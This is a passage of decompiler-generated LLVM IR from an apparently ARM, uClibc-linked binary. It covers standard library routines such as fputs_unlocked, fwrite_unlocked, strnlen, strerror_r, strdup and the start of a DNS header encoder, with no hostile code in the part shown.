  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 26, 27, 25, 17, 28, 18, 19, 20, 29, 21, 30, 31, 22, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 704, { 1, 2, 0 }
  uselistorder i32 -5, { 3, 1, 0, 2 }
  uselistorder i32 -36936, { 0, 2, 1, 3 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1, 6 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 2147483647, { 3, 4, 1, 6, 7, 0, 2, 5 }
  uselistorder i32 196, { 2, 1, 4, 0, 5, 6, 7, 3 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder label %dec_label_pc_14e58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e54, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_14e20, { 1, 0 }
  uselistorder label %dec_label_pc_14dec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14de4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14da0, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_14d58, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b6c, { 1, 0 }
  uselistorder label %dec_label_pc_14b20, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14a9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a98, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_14a38, { 1, 0 }
  uselistorder label %dec_label_pc_14a34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_149d8, { 1, 0 }
  uselistorder label %dec_label_pc_149ac, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14e94 = load i32, i32* @r4, align 4
  store i32 %v3_14e94, i32* %stack_var_-16, align 4
  %v6_14e94 = load i32, i32* @r5, align 4
  %v9_14e94 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14ea0 = call i32 @strlen(i8* %arg1)
  store i32 %v3_14ea0, i32* @r6, align 4
  %v0_14ea8 = load i32, i32* @r5, align 4
  %v0_14eac = load i32, i32* @r4, align 4
  %v5_14eb8 = inttoptr i32 %v0_14ea8 to i16*
  %v6_14eb8 = call i32 @__GI_fwrite_unlocked(i32 %v0_14eac, i32 1, i32 %v3_14ea0, i16* %v5_14eb8)
  %v1_14ebc = load i32, i32* @r6, align 4
  %v9_14ebc = icmp eq i32 %v6_14eb8, %v1_14ebc
  br i1 %v9_14ebc, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_14ec8 = phi i32 [ %v6_14eb8, %entry ], [ -1, %bb ]
  %v2_14ec4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ec4, i32* @r4, align 4
  store i32 %v6_14e94, i32* @r5, align 4
  store i32 %v9_14e94, i32* @r6, align 4
  ret i32 %v1_14ec8

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v9_14ecc = load i32, i32* @r6, align 4
  %v12_14ecc = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_14ed4 = load i16, i16* %arg4, align 2
  %v1_14ed8 = and i16 %v3_14ed4, 192
  %v2_14edc = icmp eq i16 %v1_14ed8, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_14edc, label %dec_label_pc_14f08, label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %entry
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_14efc = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_14f00 = icmp eq i32 %v4_14efc, 0
  br i1 %v2_14f00, label %dec_label_pc_14f08thread-pre-split, label %dec_label_pc_14f70

dec_label_pc_14f08thread-pre-split:               ; preds = %dec_label_pc_14ef4
  %v0_14f08.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14f08thread-pre-split, %entry
  %v0_14f2c = phi i32 [ %v0_14f08.pr, %dec_label_pc_14f08thread-pre-split ], [ %arg2, %entry ]
  %v2_14f08 = icmp eq i32 %v0_14f2c, 0
  br i1 %v2_14f08, label %dec_label_pc_14f70, label %bb

bb:                                               ; preds = %dec_label_pc_14f08
  %v1_14f0c = load i32, i32* @r6, align 4
  %v3_14f0c = icmp eq i32 %v1_14f0c, 0
  br i1 %v3_14f0c, label %dec_label_pc_14f70, label %dec_label_pc_14f14

dec_label_pc_14f14:                               ; preds = %bb
  store i32 %v0_14f2c, i32* %r1.global-to-local, align 4
  %v2_14f1c = udiv i32 -1, %v0_14f2c
  %tmp9 = icmp ugt i32 %v1_14f0c, %v2_14f1c
  %v0_14f48 = load i32, i32* @r5, align 4
  %v1_14f48 = inttoptr i32 %v0_14f48 to i16*
  br i1 %tmp9, label %dec_label_pc_14f48, label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f14
  %v2_14f2c = mul i32 %v1_14f0c, %v0_14f2c
  store i32 %v2_14f2c, i32* %r1.global-to-local, align 4
  %v0_14f30 = load i32, i32* @r7, align 4
  %v5_14f34 = call i32 @__stdio_fwrite(i32 %v0_14f30, i32 %v2_14f2c, i16* %v1_14f48)
  %v0_14f38 = load i32, i32* @r4, align 4
  %v2_14f3c = udiv i32 %v5_14f34, %v0_14f38
  store i32 %v2_14f3c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f74

dec_label_pc_14f48:                               ; preds = %dec_label_pc_14f14
  %v2_14f48 = load i16, i16* %v1_14f48, align 2
  %v1_14f4c = or i16 %v2_14f48, 8
  store i16 %v1_14f4c, i16* %v1_14f48, align 2
  %v0_14f58 = call i32 @__aeabi_read_tp()
  %v3_14f5c = load i16, i16* @global_var_222f0.75, align 2
  %v4_14f5c = sext i16 %v3_14f5c to i32
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14f68 = add i32 %v4_14f5c, %v0_14f58
  %v4_14f68 = inttoptr i32 %v3_14f68 to i32*
  store i32 22, i32* %v4_14f68, align 4
  %v0_14f74.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f74

dec_label_pc_14f70:                               ; preds = %dec_label_pc_14f08, %dec_label_pc_14ef4, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f74

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f48, %dec_label_pc_14f28, %dec_label_pc_14f70
  %v0_14f74 = phi i32 [ %v0_14f74.pre, %dec_label_pc_14f48 ], [ %v2_14f3c, %dec_label_pc_14f28 ], [ 0, %dec_label_pc_14f70 ]
  store i32 %v9_14ecc, i32* @r6, align 4
  store i32 %v12_14ecc, i32* @r7, align 4
  ret i32 %v0_14f74

; uselistorder directives
  uselistorder i16* %v1_14f48, { 0, 2, 1 }
  uselistorder i32 %v1_14f0c, { 1, 0, 2 }
  uselistorder i32 %v0_14f2c, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_14f74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f70, { 2, 0, 1 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_14f90 = load i32, i32* @r0, align 4
  %v1_14f90 = load i32, i32* @r1, align 4
  %v2_14f90 = inttoptr i32 %v0_14f90 to i8*
  %v3_14f90 = call i32 @_memcpy(i8* %v2_14f90, i32 %v1_14f90)
  ret i32 %v3_14f90

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_14fa0 = icmp eq i32 %arg2, 0
  br i1 %v2_14fa0, label %bb, label %dec_label_pc_14fb4

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_14fb4:                               ; preds = %entry
  %v2_14fb4 = add i32 %tmp, %arg2
  %v3_14fb4 = icmp ult i32 %v2_14fb4, %tmp
  br i1 %v3_14fb4, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_14fb4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14fb4, %bb19
  %v5_15054 = phi i32 [ %v2_14fb4, %dec_label_pc_14fb4 ], [ -1, %bb19 ]
  %v1_14fd44 = urem i32 %tmp, 4
  %v2_14fd45 = icmp eq i32 %v1_14fd44, 0
  br i1 %v2_14fd45, label %dec_label_pc_14fdc, label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %bb20, %dec_label_pc_14fd0
  %v0_14fd0 = phi i32 [ %v1_14fd0, %dec_label_pc_14fd0 ], [ %tmp, %bb20 ]
  %v1_14fc4 = inttoptr i32 %v0_14fd0 to i8*
  %v2_14fc4 = load i8, i8* %v1_14fc4, align 1
  %v2_14fc8 = icmp eq i8 %v2_14fc4, 0
  br i1 %v2_14fc8, label %dec_label_pc_15050, label %dec_label_pc_14fd0

dec_label_pc_14fd0:                               ; preds = %dec_label_pc_14fc4
  %v1_14fd0 = add i32 %v0_14fd0, 1
  %v1_14fd4 = urem i32 %v1_14fd0, 4
  %v2_14fd4 = icmp eq i32 %v1_14fd4, 0
  br i1 %v2_14fd4, label %dec_label_pc_14fdc, label %dec_label_pc_14fc4

dec_label_pc_14fdc:                               ; preds = %dec_label_pc_14fd0, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_14fd0, %dec_label_pc_14fd0 ]
  %v3_1504030 = icmp ult i32 %storemerge.lcssa, %v5_15054
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_1504030, label %dec_label_pc_14fe4, label %dec_label_pc_15050

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_1503c, %dec_label_pc_14fdc
  %v0_1503437 = phi i32 [ %v4_14fe4, %dec_label_pc_1503c ], [ %storemerge.lcssa, %dec_label_pc_14fdc ]
  %v1_14fe4 = inttoptr i32 %v0_1503437 to i32*
  %v2_14fe4 = load i32, i32* %v1_14fe4, align 4
  %v4_14fe4 = add i32 %v0_1503437, 4
  %v2_14fe8 = add i32 %v2_14fe4, -16843009
  %v2_14fec = and i32 %v2_14fe8, -2139062144
  store i32 %v2_14fec, i32* @ip, align 4
  %v2_14ff0 = icmp eq i32 %v2_14fec, 0
  br i1 %v2_14ff0, label %dec_label_pc_1503c, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe4
  %v2_14ff8 = inttoptr i32 %v0_1503437 to i8*
  %v3_14ff8 = load i8, i8* %v2_14ff8, align 1
  %v2_14ffc = icmp eq i8 %v3_14ff8, 0
  br i1 %v2_14ffc, label %bb21, label %dec_label_pc_1500c

bb21:                                             ; preds = %dec_label_pc_14ff8
  br label %dec_label_pc_15050

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14ff8
  %v1_1500c = add i32 %v0_1503437, 1
  %v2_1500c = inttoptr i32 %v1_1500c to i8*
  %v3_1500c = load i8, i8* %v2_1500c, align 1
  %v2_15010 = icmp eq i8 %v3_1500c, 0
  br i1 %v2_15010, label %dec_label_pc_15050, label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_1500c
  %v1_1501c = add i32 %v0_1503437, 2
  %v2_1501c = inttoptr i32 %v1_1501c to i8*
  %v3_1501c = load i8, i8* %v2_1501c, align 1
  %v2_15020 = icmp eq i8 %v3_1501c, 0
  br i1 %v2_15020, label %dec_label_pc_15050, label %dec_label_pc_1502c

dec_label_pc_1502c:                               ; preds = %dec_label_pc_1501c
  %v1_1502c = add i32 %v0_1503437, 3
  %v2_1502c = inttoptr i32 %v1_1502c to i8*
  %v3_1502c = load i8, i8* %v2_1502c, align 1
  %v2_15030 = icmp eq i8 %v3_1502c, 0
  br i1 %v2_15030, label %dec_label_pc_15050, label %dec_label_pc_1503c

dec_label_pc_1503c:                               ; preds = %dec_label_pc_1502c, %dec_label_pc_14fe4
  %v3_15040 = icmp ult i32 %v4_14fe4, %v5_15054
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15040, label %dec_label_pc_14fe4, label %dec_label_pc_15050

dec_label_pc_15050:                               ; preds = %dec_label_pc_1503c, %dec_label_pc_14fdc, %dec_label_pc_14fc4, %dec_label_pc_1500c, %dec_label_pc_1501c, %dec_label_pc_1502c, %bb21
  %v1_15050 = phi i32 [ %v0_1503437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_14fdc ], [ %v1_1500c, %dec_label_pc_1500c ], [ %v1_1501c, %dec_label_pc_1501c ], [ %v1_1502c, %dec_label_pc_1502c ], [ %v5_15054, %dec_label_pc_1503c ], [ %v0_14fd0, %dec_label_pc_14fc4 ]
  %v3_15050 = icmp uge i32 %v5_15054, %v1_15050
  %v9_15050 = icmp eq i32 %v5_15054, %v1_15050
  %v2_15054 = xor i1 %v3_15050, true
  %v3_15054 = or i1 %v9_15050, %v2_15054
  br i1 %v3_15054, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_15050
  %v6_15054 = sub i32 %v5_15054, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_15050, %bb22
  %v5_15058 = phi i32 [ %v1_15050, %dec_label_pc_15050 ], [ %v6_15054, %bb22 ]
  %v2_15058 = xor i1 %v9_15050, true
  %v3_15058 = and i1 %v3_15050, %v2_15058
  br i1 %v3_15058, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_15058 = sub i32 %v5_15058, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_15060 = phi i32 [ 0, %bb ], [ %v5_15058, %bb23 ], [ %v6_15058, %bb24 ]
  ret i32 %v1_15060

; uselistorder directives
  uselistorder i1 %v3_15050, { 1, 0 }
  uselistorder i32 %v4_14fe4, { 1, 0 }
  uselistorder i32 %v0_1503437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14fd0, { 1, 0, 2 }
  uselistorder i32 %v5_15054, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_15050, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_14fc4, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15074 = call i32 @__xpg_strerror_r()
  %v0_15078 = load i32, i32* @r4, align 4
  ret i32 %v0_15078
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15084 = load i32, i32* @r4, align 4
  %v9_15084 = load i32, i32* @r6, align 4
  %v0_1508c = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  store i32 %v0_1508c, i32* @ip, align 4
  %v0_1509c = load i32, i32* @r1, align 4
  store i32 %v0_1509c, i32* @r7, align 4
  %v0_150a0 = load i32, i32* @r2, align 4
  store i32 %v0_150a0, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1508c, 124
  br i1 %tmp, label %dec_label_pc_150d8, label %dec_label_pc_150a8

dec_label_pc_150a8:                               ; preds = %entry
  br label %dec_label_pc_150c0

dec_label_pc_150b4:                               ; preds = %dec_label_pc_150c0
  br i1 %v2_150cc, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_150b4
  %v2_150b8 = add i32 %v1_150d0, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_150b4, %bb
  %v0_150c01 = phi i32 [ %v1_150d0, %dec_label_pc_150b4 ], [ %v2_150b8, %bb ]
  %v1_150bc = add i32 %v0_150bc, 1
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %dec_label_pc_150a8, %bb15
  %v1_150d0 = phi i32 [ %v0_1508c, %dec_label_pc_150a8 ], [ %v0_150c01, %bb15 ]
  %v0_150bc = phi i32 [ add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -36888), %dec_label_pc_150a8 ], [ %v1_150bc, %bb15 ]
  store i32 %v0_150bc, i32* @r5, align 4
  %v2_150c0 = icmp eq i32 %v1_150d0, 0
  %v1_150c4 = inttoptr i32 %v0_150bc to i8*
  %v2_150c4 = load i8, i8* %v1_150c4, align 1
  %v3_150c4 = zext i8 %v2_150c4 to i32
  store i32 %v3_150c4, i32* @r3, align 4
  %v2_150cc = icmp eq i8 %v2_150c4, 0
  br i1 %v2_150c0, label %dec_label_pc_150cc, label %dec_label_pc_150b4

dec_label_pc_150cc:                               ; preds = %dec_label_pc_150c0
  br i1 %v2_150cc, label %dec_label_pc_150d8, label %bb16

bb16:                                             ; preds = %dec_label_pc_150cc
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15114

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150cc, %entry
  store i32 %v0_1508c, i32* @r2, align 4
  %v3_150e0 = ashr i32 %v0_1508c, 31
  store i32 %v3_150e0, i32* @r3, align 4
  %v6_150f4 = bitcast i32* %stack_var_-25 to i8*
  %v7_150f4 = call i32 @_uintmaxtostr(i8* %v6_150f4)
  %v1_150fc = add i32 %v7_150f4, -14
  store i32 %v1_150fc, i32* @r5, align 4
  %v0_15100 = load i32, i32* @r6, align 4
  %v2_15100 = add i32 %v0_15100, -36904
  store i32 %v2_15100, i32* @r1, align 4
  store i32 %v1_150fc, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_1510c = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15114.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %bb16, %dec_label_pc_150d8
  %v0_15114 = phi i32 [ %v0_150bc, %bb16 ], [ %v0_15114.pre, %dec_label_pc_150d8 ]
  %v1_15114 = inttoptr i32 %v0_15114 to i8*
  %v3_15118 = call i32 @strlen(i8* %v1_15114)
  %v0_1511c = load i32, i32* @r7, align 4
  %v2_1511c = icmp eq i32 %v0_1511c, 0
  br i1 %v2_1511c, label %bb17, label %dec_label_pc_15114._crit_edge

dec_label_pc_15114._crit_edge:                    ; preds = %dec_label_pc_15114
  %v1_15128.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_15114
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15114._crit_edge, %bb17
  %v1_15128 = phi i32 [ %v1_15128.pre, %dec_label_pc_15114._crit_edge ], [ 0, %bb17 ]
  %v1_15124 = add i32 %v3_15118, 1
  %v3_15128 = icmp uge i32 %v1_15124, %v1_15128
  %v9_15128 = icmp eq i32 %v1_15124, %v1_15128
  %v2_1512c = xor i1 %v3_15128, true
  %v3_1512c = or i1 %v9_15128, %v2_1512c
  br i1 %v3_1512c, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_15124, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1513c = phi i32 [ %v1_15128, %bb18 ], [ %v1_15124, %bb19 ]
  %v2_15130 = xor i1 %v9_15128, true
  %v3_15130 = and i1 %v3_15128, %v2_15130
  br i1 %v3_15130, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_15134 = icmp eq i32 %v0_1513c, 0
  br i1 %v2_15134, label %dec_label_pc_15158, label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %bb22
  store i32 %v0_1513c, i32* @r2, align 4
  %v0_15140 = load i32, i32* @r5, align 4
  store i32 %v0_15140, i32* @r1, align 4
  store i32 %v0_1511c, i32* @r0, align 4
  %v0_15148 = call i32 @memcpy()
  %v0_1514c = load i32, i32* @r4, align 4
  %v1_1514c = load i32, i32* @r7, align 4
  %v2_1514c = add i32 %v1_1514c, %v0_1514c
  %v3_15154 = add i32 %v2_1514c, -1
  %v4_15154 = inttoptr i32 %v3_15154 to i8*
  store i8 0, i8* %v4_15154, align 1
  br label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %bb22, %dec_label_pc_1513c
  %v0_15158 = load i32, i32* %r6.global-to-local, align 4
  %v2_15158 = icmp eq i32 %v0_15158, 0
  br i1 %v2_15158, label %dec_label_pc_15170, label %dec_label_pc_15160

dec_label_pc_15160:                               ; preds = %dec_label_pc_15158
  %v0_15164 = call i32 @__aeabi_read_tp()
  %v3_15168 = load i16, i16* @global_var_222f0.75, align 2
  %v4_15168 = sext i16 %v3_15168 to i32
  %v0_1516c = load i32, i32* %r6.global-to-local, align 4
  %v3_1516c = add i32 %v4_15168, %v0_15164
  %v4_1516c = inttoptr i32 %v3_1516c to i32*
  store i32 %v0_1516c, i32* %v4_1516c, align 4
  %v0_15170.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15170

dec_label_pc_15170:                               ; preds = %dec_label_pc_15158, %dec_label_pc_15160
  %v0_15170 = phi i32 [ 0, %dec_label_pc_15158 ], [ %v0_15170.pre, %dec_label_pc_15160 ]
  store i32 %v3_15084, i32* @r4, align 4
  store i32 %v9_15084, i32* %r6.global-to-local, align 4
  ret i32 %v0_15170

; uselistorder directives
  uselistorder i1 %v3_15128, { 1, 0 }
  uselistorder i32 %v0_150bc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_150d0, { 1, 0, 2 }
  uselistorder i32 %v0_1508c, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder label %dec_label_pc_15170, { 1, 0 }
  uselistorder label %dec_label_pc_15158, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15114, { 1, 0 }
  uselistorder label %dec_label_pc_150c0, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15190 = load i32, i32* @r4, align 4
  store i32 %v3_15190, i32* %stack_var_-16, align 4
  %v9_15190 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_15198 = call i32 @strlen(i8* %arg1)
  %v1_1519c = add i32 %v3_15198, 1
  store i32 %v1_1519c, i32* @r4, align 4
  %v1_151a4 = call i32 @malloc(i32 %v1_1519c)
  store i32 %v1_151a4, i32* %r5.global-to-local, align 4
  %v2_151a8 = icmp eq i32 %v1_151a4, 0
  br i1 %v2_151a8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_151b4 = xor i1 %v2_151a8, true
  call void @__pseudo_cond_branch(i1 %v1_151b4, i32 ptrtoint (i32* @global_var_acc0.275 to i32))
  %v0_151b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_151bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_151bc, i32* @r4, align 4
  store i32 %v9_15190, i32* @r6, align 4
  ret i32 %v0_151b8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 11, 10, 9, 3, 2, 8, 7, 6, 12, 5, 4, 13, 16, 1, 15, 14, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_151c8 = load i32, i32* @lr, align 4
  store i32 %v0_151c8, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_151d4 = icmp sgt i32 %arg3, 11
  br i1 %v7_151d4, label %dec_label_pc_151dc, label %dec_label_pc_152a8

dec_label_pc_151dc:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_151dc = add i32 %tmp, 1
  %v2_151dc = inttoptr i32 %v1_151dc to i8*
  %v3_151dc = load i8, i8* %v2_151dc, align 1
  store i8 %v3_151dc, i8* %tmp16, align 1
  %v0_151e4 = load i32, i32* @ip, align 4
  %v1_151e4 = inttoptr i32 %v0_151e4 to i32*
  %v2_151e4 = load i32, i32* %v1_151e4, align 4
  %v1_151e8 = trunc i32 %v2_151e4 to i8
  %v4_151e8 = add i32 %arg2, 1
  %v5_151e8 = inttoptr i32 %v4_151e8 to i8*
  store i8 %v1_151e8, i8* %v5_151e8, align 1
  %v0_151ec = load i32, i32* @ip, align 4
  %v1_151ec = add i32 %v0_151ec, 8
  %v2_151ec = inttoptr i32 %v1_151ec to i32*
  %v3_151ec = load i32, i32* %v2_151ec, align 4
  %v1_151f0 = add i32 %v0_151ec, 20
  %v2_151f0 = inttoptr i32 %v1_151f0 to i32*
  %v3_151f0 = load i32, i32* %v2_151f0, align 4
  %v1_151f4 = add i32 %v0_151ec, 4
  %v2_151f4 = inttoptr i32 %v1_151f4 to i32*
  %v3_151f4 = load i32, i32* %v2_151f4, align 4
  %v1_151f8 = add i32 %v0_151ec, 12
  %v2_151f8 = inttoptr i32 %v1_151f8 to i32*
  %v3_151f8 = load i32, i32* %v2_151f8, align 4
  %v2_151fc = icmp eq i32 %v3_151f0, 0
  br i1 %v2_151fc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_151dc
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_151dc, %bb
  %v0_1520c = phi i32 [ 0, %dec_label_pc_151dc ], [ 1, %bb ]
  %v1_15204 = urem i32 %v3_151ec, 16
  %v2_15208 = icmp eq i32 %v3_151f4, 0
  %v4_1520c = mul nuw nsw i32 %v1_15204, 8
  %v5_1520c = or i32 %v0_1520c, %v4_1520c
  %v1_15210 = add i32 %v0_151ec, 16
  %v2_15210 = inttoptr i32 %v1_15210 to i32*
  %v3_15210 = load i32, i32* %v2_15210, align 4
  %. = select i1 %v2_15208, i32 0, i32 128
  %v2_1521c = icmp eq i32 %v3_151f8, 0
  %storemerge11 = select i1 %v2_1521c, i32 0, i32 4
  %v2_15228 = or i32 %v5_1520c, %.
  %v2_1522c = icmp eq i32 %v3_15210, 0
  %.26 = select i1 %v2_1522c, i32 0, i32 2
  %v2_15238 = or i32 %v2_15228, %storemerge11
  %v2_1523c = or i32 %v2_15238, %.26
  %v1_15240 = trunc i32 %v2_1523c to i8
  %v2_15240 = load i32, i32* %lr.global-to-local, align 4
  %v3_15240 = add i32 %v2_15240, 2
  %v4_15240 = inttoptr i32 %v3_15240 to i8*
  store i8 %v1_15240, i8* %v4_15240, align 1
  %v0_15244 = load i32, i32* @ip, align 4
  %v1_15244 = add i32 %v0_15244, 24
  %v1_15248 = inttoptr i32 %v1_15244 to i32*
  %v2_15248 = load i32, i32* %v1_15248, align 4
  %v3_15248 = add i32 %v0_15244, 28
  %v4_15248 = inttoptr i32 %v3_15248 to i32*
  %v5_15248 = load i32, i32* %v4_15248, align 4
  %v2_1524c = icmp eq i32 %v2_15248, 0
  %v1_15250 = urem i32 %v5_15248, 16
  %v0_1525c = select i1 %v2_1524c, i32 0, i32 128
  %v2_1525c = or i32 %v1_15250, %v0_1525c
  %v1_15260 = trunc i32 %v2_1525c to i8
  %v2_15260 = load i32, i32* %lr.global-to-local, align 4
  %v3_15260 = add i32 %v2_15260, 3
  %v4_15260 = inttoptr i32 %v3_15260 to i8*
  store i8 %v1_15260, i8* %v4_15260, align 1
